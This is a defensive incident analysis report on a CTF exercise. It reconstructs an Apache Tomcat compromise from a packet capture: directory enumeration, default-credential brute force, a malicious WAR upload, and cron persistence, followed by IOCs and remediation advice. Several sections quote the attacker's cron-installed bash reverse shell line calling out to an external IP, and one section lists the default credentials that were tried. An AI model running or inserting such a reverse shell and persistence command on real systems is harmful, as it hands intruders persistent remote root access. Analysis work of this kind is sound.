# 🚨 Incident Analysis Report — Apache Tomcat Takeover Attack

* **Date of Analysis:** September 28, 2025
* **Analyst:** Belhamici Abderrahmane
* **Source:** [CyberDefenders CTF — *Tomcat Takeover*](https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/)
* **Target Environment:** Apache Tomcat Web Server
* **Dataset:** Network packet capture (PCAP)
* **Incident Date:** September 10, 2023

---

## 1. Executive Summary

This report details the analysis of a sophisticated Apache Tomcat web server compromise involving systematic reconnaissance, credential brute-force attacks, malicious file upload, and establishment of persistent remote access. The attack demonstrates a complete compromise lifecycle from initial port scanning through admin panel exploitation to reverse shell deployment and persistence mechanism establishment.

The attacker successfully gained root-level access to the target system and established a reverse shell connection that automatically reconnects every minute, providing sustained command and control capabilities. The compromise showcases advanced persistent threat (APT) tactics targeting web application management interfaces.

---

## 2. Case Overview

* **Incident Timeline:** September 10, 2023
* **Attack Duration:** 18:13:06 - 18:27:37 UTC (~14 minutes 30 seconds)
* **Target System:** Apache Tomcat/7.0.88 Server (10.0.0.112)
* **Primary Attacker:** 14.0.0.120 (China-based threat actor)
* **Attack Vector:** Web application exploitation via Tomcat Manager interface
* **Persistence Mechanism:** Cron-based reverse shell callback system
* **Final Access Level:** Root privileges with persistent access

---

## 3. Key Findings

### 3.1 Network Infrastructure Summary

* **Primary Target:** `10.0.0.112` (Apache Tomcat/7.0.88 + SSH Server)
* **Primary Attacker:** `14.0.0.120` (China, Firefox 115.0 user agent)
* **Internal Users:** `10.0.0.115` (Ubuntu Firefox, legitimate admin activity)
* **SMB Server:** `10.0.0.105` (Internal file server)
* **Attack Timeline:** 6-stage attack over 14 minutes 30 seconds
* **Compromise Level:** Complete root access with persistent backdoor
* **Data Access:** Full server compromise with potential lateral movement

### 3.2 Attack Timeline Overview

**Phase 1 - Network Reconnaissance (18:13:06 - 18:15:51)**
* Initial network scanning and service discovery
* Port enumeration targeting web services
* Service fingerprinting of Apache Tomcat installation

**Phase 2 - Directory Enumeration (18:15:51 - 18:18:52)**
* Gobuster tool deployment for directory brute-forcing
* Discovery of Tomcat Manager interface (`/manager/`)
* Administrative interface identification and mapping

**Phase 3 - Credential Brute-Force Attack (18:19:56 - 18:20:24)**
* Systematic brute-force attack against `/manager/html/` endpoint
* Multiple authentication attempts with common credentials
* Successful compromise with `admin:tomcat` credentials

**Phase 4 - Malicious File Upload (18:22:14)**
* WAR file deployment: `JXQOZY.war`
* Web shell upload through Tomcat Manager interface
* Remote code execution capability establishment

**Phase 5 - Web Shell Activation (18:22:23)**
* Web shell access via `GET /JXQOZY/` request
* Initial command execution and privilege verification
* System reconnaissance and environment assessment

**Phase 6 - Persistence Establishment (18:22:23 - 18:27:37)**
* Reverse shell deployment with automatic callback
* Cron job creation for persistent access
* Root-level privilege confirmation and cleanup

---

## 4. Technical Analysis

### 4.1 Network Reconnaissance Analysis

**Target Discovery:**
* **Primary Service:** Apache Tomcat/7.0.88 on port 8080
* **Secondary Service:** SSH server on port 22
* **Management Interface:** Tomcat Manager accessible at `/manager/html/`
* **Service Fingerprinting:** Complete application stack identification

**Scanning Pattern:**
* **Methodology:** Systematic port enumeration
* **Focus Areas:** Web services and administrative interfaces
* **Tool Usage:** Automated scanning with manual verification
* **Duration:** Efficient reconnaissance phase (~3 minutes)

### 4.2 Directory Enumeration Phase

**Tool Identification:** Gobuster
* **Target Endpoint:** Apache Tomcat web server (port 8080)
* **Discovery Method:** Dictionary-based brute-forcing
* **Critical Finding:** `/manager/` administrative directory
* **Access Pattern:** Direct enumeration of management interfaces

**Key Discoveries:**
* Tomcat Manager interface exposure
* Administrative functionality availability
* Potential file upload capabilities
* Authentication mechanism identification

### 4.3 Credential Brute-Force Attack Analysis

- **Attack Target:** `/manager/html/` (Tomcat Manager Interface)
- **Attack Timeline:** 18:19:56 - 18:20:24 UTC
- **Attack Duration:** 28 seconds (highly efficient)

**Credential Attempts Analysis:**
1. **Attempt 1 (18:19:56):** No credentials → HTTP 401 Unauthorized
2. **Attempt 2 (18:20:03):** `admin:admin` → HTTP 401 Unauthorized
3. **Attempt 3 (18:20:08):** `tomcat:tomcat` → HTTP 401 Unauthorized
4. **Attempt 4 (18:20:13):** `admin:` (empty password) → HTTP 401 Unauthorized
5. **Attempt 5 (18:20:18):** `admin:s3cr3t` → HTTP 401 Unauthorized
6. **Attempt 6 (18:20:21):** `tomcat:s3cr3t` → HTTP 401 Unauthorized
7. **Successful Login (18:20:24):** `admin:tomcat` → HTTP 200 OK

**Attack Characteristics:**
* **Pattern:** Common default credentials testing
* **Speed:** 5-7 second intervals between attempts
* **Success Rate:** 1/7 attempts successful
* **Methodology:** Manual testing of typical Tomcat default passwords

### 4.4 Malicious File Upload Analysis

* **Upload Session:** 18:22:14 UTC
* **HTTP Request Analysis:**
```
POST /manager/html/upload;jsessionid=0DE586F27B2F48D0CA045F731E0E9E71?org.apache.catalina.filters.CSRF_NONCE=83EDF4E2462ECC725BAF342DD7A46974 HTTP/1.1
```

**Malicious File Details:**
* **Filename:** `JXQOZY.war`
* **File Type:** Web Application Archive (WAR)
* **Purpose:** Web shell deployment
* **Upload Method:** Tomcat Manager interface abuse
* **Session ID:** `0DE586F27B2F48D0CA045F731E0E9E71`
* **CSRF Token:** `83EDF4E2462ECC725BAF342DD7A46974`

**Deployment Characteristics:**
* **Automatic Deployment:** Tomcat auto-deployed the WAR file
* **Access Path:** `/JXQOZY/` endpoint created
* **Functionality:** Remote command execution capability
* **Persistence:** Application-level backdoor establishment

### 4.5 Web Shell Execution Analysis

* **Activation Request:** `GET /JXQOZY/ HTTP/1.1` at 18:22:23 UTC
* **Execution Context:** Web server user (initially), escalated to root

**Command Sequence Executed:**
```bash
# Initial privilege verification
whoami
# Response: root

# Working directory setup
cd /tmp
pwd
# Response: /tmp

# Persistence mechanism creation
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron
crontab -i cron

# Verification of persistence installation
crontab -l
# Response: * * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

### 4.6 Reverse Shell and Persistence Analysis

**Persistence Command Breakdown:**
```bash
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

**Cron Schedule Analysis:**
* `* * * * *` = Execute every minute of every hour, every day
* **Frequency:** Once per minute (60 times per hour)
* **Persistence Level:** Extremely high

**Reverse Shell Components:**
* `/bin/bash -c`: Execute bash command
* `bash -i`: Interactive bash shell
* `>&`: Redirect both stdout (standard output) and stderr (standard error)
* `/dev/tcp/14.0.0.120/443`: Create TCP connection to attacker IP on port 443
* `0>&1`: Redirect stdin (standard input) to the same connection as stdout

**Technical Mechanism:**
1. **Shell Creation:** `bash -i` creates an interactive shell
2. **Output Redirection:** `>&` sends all command output to the network connection
3. **Network Connection:** `/dev/tcp/14.0.0.120/443` establishes TCP connection to attacker
4. **Input Redirection:** `0>&1` allows attacker to send commands through the connection
5. **Stealth:** Uses port 443 (HTTPS) to blend with legitimate traffic

**Result:** Every minute, the compromised system automatically connects to the attacker's machine, providing an interactive shell with root privileges.

---

## 5. User Agent and Infrastructure Analysis

### 5.1 Attack Infrastructure Fingerprinting

**Primary Attacker (14.0.0.120):**
* **Geographic Location:** China
* **Browser:** Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
* **Operating System:** Linux x86_64
* **Activity Pattern:** Systematic attack progression over 14 minutes
* **Behavior Profile:** Professional APT-style methodology

**Internal Network Activity:**
* **Admin User (10.0.0.115):** Ubuntu Linux, Firefox 116.0
* **Target Server (10.0.0.112):** Apache Tomcat/7.0.88 + SSH
* **File Server (10.0.0.105):** SMB2 services

### 5.2 Concurrent Network Activity

**SMB File Access (10.0.0.115 → 10.0.0.105):**
* **Timeline:** 18:13:18 - 18:13:32 UTC (concurrent with attack)
* **Files Accessed:**
  - `work_report2023.pdf` (SHA-256: 90aa3e5ed5befcd1cd0909c5e339efce548503cf636c90f1c71ff2e22c6b652a)
  - `work_report2022.pdf` (SHA-256: 3fff348c1bc4079afb2901adc1fbccab178f568d491d9344f1b71018f4056dd7)
* **User Context:** WORKGROUP\root on CYBERDEFENDERS-VIRTUAL-MACHINE

**SSH Activity (10.0.0.115 → 10.0.0.112):**
* **Timeline:** 18:13:45 - 18:27:37 UTC
* **Protocol:** SSH (port 22)
* **Potential Impact:** Legitimate administrative access during compromise

---

## 6. Attack Vector Analysis

### 6.1 Multi-Stage Attack Flow

* **Stage 1:** Network reconnaissance to identify Apache Tomcat installation and services
* **Stage 2:** Directory enumeration using Gobuster to discover management interfaces  
* **Stage 3:** Credential brute-force attack against Tomcat Manager interface
* **Stage 4:** Malicious WAR file upload through compromised management interface
* **Stage 5:** Web shell activation and initial command execution
* **Stage 6:** Persistent backdoor establishment via cron-based reverse shell

### 6.2 Attack Sophistication Assessment

**Advanced Techniques:**
* **Systematic approach:** Methodical progression through attack phases
* **Tool utilization:** Professional-grade enumeration tools (Gobuster)
* **Stealth considerations:** Use of HTTPS port (443) for callback traffic
* **Persistence mechanisms:** Automated reconnection every minute
* **Privilege escalation:** Achievement of root-level access
* **Operational security:** Clean execution with minimal detection signatures

---

## 7. Indicators of Compromise (IOCs)

### 7.1 Network Indicators

| Indicator | Type | Description | Threat Level |
|-----------|------|-------------|--------------|
| `14.0.0.120` | IP Address | Primary attacker system (China) | Critical |
| `10.0.0.112` | IP Address | Compromised Tomcat server | Critical |
| `JXQOZY.war` | Filename | Malicious web application archive | Critical |
| `/manager/html/` | URL Path | Compromised management interface | High |
| `/JXQOZY/` | URL Path | Web shell access endpoint | Critical |
| `443/TCP` | Port | Reverse shell callback port | High |

### 7.2 Credential Indicators

| Credential | Type | Description | Threat Level |
|------------|------|-------------|--------------|
| `admin:tomcat` | Username:Password | Compromised Tomcat credentials | Critical |
| `0DE586F27B2F48D0CA045F731E0E9E71` | Session ID | Compromised user session | High |
| `83EDF4E2462ECC725BAF342DD7A46974` | CSRF Token | Session security token | Medium |

### 7.3 Command Indicators

| Command | Description | Threat Level |
|---------|-------------|--------------|
| `crontab -i cron` | Persistence installation | Critical |
| `bash -i >& /dev/tcp/14.0.0.120/443 0>&1` | Reverse shell command | Critical |
| `whoami` | Privilege verification | Medium |
| `cd /tmp` | Working directory change | Low |

### 7.4 File and Process Indicators

| Indicator | Type | Description | Threat Level |
|-----------|------|-------------|--------------|
| `cron` | Filename | Temporary cron job file | High |
| `gobuster` | Tool | Directory enumeration tool | Medium |
| Apache Tomcat/7.0.88 | Service | Compromised web service | High |

---

## 8. Impact Assessment

### 8.1 Immediate Impact

* **Complete Server Compromise:** Full root-level access to Apache Tomcat server
* **Persistent Backdoor:** Automatic reverse shell connection every minute
* **Administrative Interface Compromise:** Tomcat Manager interface fully compromised
* **Web Application Security Breach:** Malicious web application deployed
* **Command Execution Capability:** Remote code execution with root privileges

### 8.2 Potential Long-term Consequences

* **Data Breach:** Complete access to all server data and applications
* **Lateral Movement:** Potential pivot point to internal network systems
* **Service Disruption:** Web application availability and integrity compromise
* **Credential Harvesting:** Access to additional system and application credentials
* **Regulatory Compliance:** Potential violations of data protection regulations
* **Reputation Damage:** Security incident exposure and customer trust impact

### 8.3 Business Impact Analysis

* **Operational Continuity:** Web services potentially compromised
* **Data Confidentiality:** All hosted applications and data at risk
* **System Integrity:** Malicious modifications and backdoor installations
* **Network Security:** Internal network exposure and lateral movement risk
* **Incident Response Costs:** Investigation, remediation, and recovery expenses

---

## 9. Recommendations

### 9.1 Immediate Actions

* **System Isolation:** Immediately isolate Apache Tomcat server (10.0.0.112)
* **Network Blocking:** Block all traffic from 14.0.0.120 across network infrastructure
* **Credential Reset:** Change all Tomcat administrative credentials immediately
* **Backdoor Removal:** Remove JXQOZY.war application and eliminate cron job persistence
* **Session Termination:** Invalidate all active Tomcat sessions
* **Port Monitoring:** Monitor for outbound connections on port 443
* **Root Access Audit:** Verify and audit all root-level access and activities

### 9.2 Forensic Analysis

* **Memory Acquisition:** Capture system memory for forensic analysis
* **Log Preservation:** Secure all web server, system, and network logs
* **File System Analysis:** Complete scan for additional malicious files
* **Network Traffic Review:** Deep packet inspection of all related traffic
* **Timeline Reconstruction:** Detailed incident timeline development
* **Evidence Chain:** Maintain proper forensic evidence handling procedures

### 9.3 Long-term Security Measures

* **Access Control Enhancement:**
  - Implement strong authentication for all administrative interfaces
  - Deploy multi-factor authentication for Tomcat Manager access
  - Restrict administrative interface access by IP address
  - Implement role-based access controls

* **Web Application Security:**
  - Update Apache Tomcat to latest secure version
  - Deploy Web Application Firewall (WAF) protection
  - Implement file upload restrictions and validation
  - Enable comprehensive access logging and monitoring
  - Regular security scanning and vulnerability assessments

* **Network Security:**
  - Deploy network segmentation for web servers
  - Implement egress filtering to block unauthorized outbound connections
  - Monitor for reverse shell patterns and suspicious network connections
  - Deploy intrusion detection and prevention systems

### 9.4 Detection and Response Enhancement

* **Monitoring Implementation:**
  - Create detection rules for Gobuster and similar enumeration tools
  - Monitor for brute-force attacks against web applications
  - Implement alerts for administrative interface access
  - Deploy behavioral analysis for reverse shell detection
  - Monitor cron job modifications and suspicious scheduled tasks

* **Incident Response Improvement:**
  - Develop playbooks for web application compromise scenarios
  - Implement automated threat hunting for similar attack patterns
  - Create rapid response procedures for persistent backdoor removal
  - Establish communication protocols for security incidents

---

## 10. Lessons Learned

### 10.1 Attack Pattern Recognition

* **Management Interface Exposure:** Administrative interfaces represent high-value targets
* **Default Credential Risks:** Common default passwords enable rapid compromise
* **Automation Effectiveness:** Automated tools significantly accelerate attack timelines
* **Persistence Criticality:** Cron-based persistence provides sustained access
* **Legitimate Feature Abuse:** Tomcat Manager functionality weaponized for malicious purposes

### 10.2 Security Control Gaps

* **Authentication Weakness:** Default credential usage in production environment
* **Access Control Failure:** Unrestricted access to administrative interfaces
* **Network Monitoring Gaps:** Reverse shell connections not detected or blocked
* **File Upload Validation:** Insufficient controls on WAR file uploads
* **Egress Filtering:** Lack of outbound connection restrictions

### 10.3 Detection Limitations

* **Tool Usage:** Gobuster enumeration went undetected
* **Brute-force Attacks:** Multiple authentication failures not alerting
* **Administrative Access:** Legitimate-appearing management interface usage
* **Reverse Shell Deployment:** Cron job modifications not monitored
* **Network Communications:** Outbound connections on port 443 not filtered

---

## 11. Technical Appendix

### 11.1 Attack Timeline Correlation

```
18:13:06 - Network activity begins (SMB file access by internal user)
18:15:51 - Attacker reconnaissance phase starts
18:18:52 - Directory enumeration (Gobuster) phase
18:19:56 - Credential brute-force attack initiation
18:20:24 - Successful authentication (admin:tomcat)
18:22:14 - Malicious WAR file upload (JXQOZY.war)
18:22:23 - Web shell activation and reverse shell deployment
18:27:37 - Final network activity observed
```

### 11.2 Reverse Shell Technical Details

**Command Construction:**
```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron
```

**Execution Flow:**
1. Cron executes command every minute
2. `/bin/bash -c` spawns new bash process
3. `bash -i` creates interactive shell
4. `>& /dev/tcp/14.0.0.120/443` redirects I/O to network connection
5. `0>&1` links stdin to stdout for bidirectional communication

**Network Connection:**
* **Protocol:** TCP
* **Direction:** Outbound from compromised server
* **Destination:** 14.0.0.120:443
* **Frequency:** Every 60 seconds
* **Stealth:** Uses HTTPS port for evasion

---

✅ **Conclusion:**
The Apache Tomcat takeover analysis reveals a highly efficient and systematic compromise achieved in under 15 minutes. The attack demonstrates professional-level techniques including automated reconnaissance, credential brute-forcing, legitimate feature abuse, and sophisticated persistence mechanisms. The establishment of a reverse shell with automatic reconnection every minute provides sustained command and control capabilities, representing a critical security breach requiring immediate response. This incident emphasizes the critical importance of securing administrative interfaces, implementing strong authentication controls, deploying comprehensive network monitoring, and establishing robust incident response capabilities for web application environments.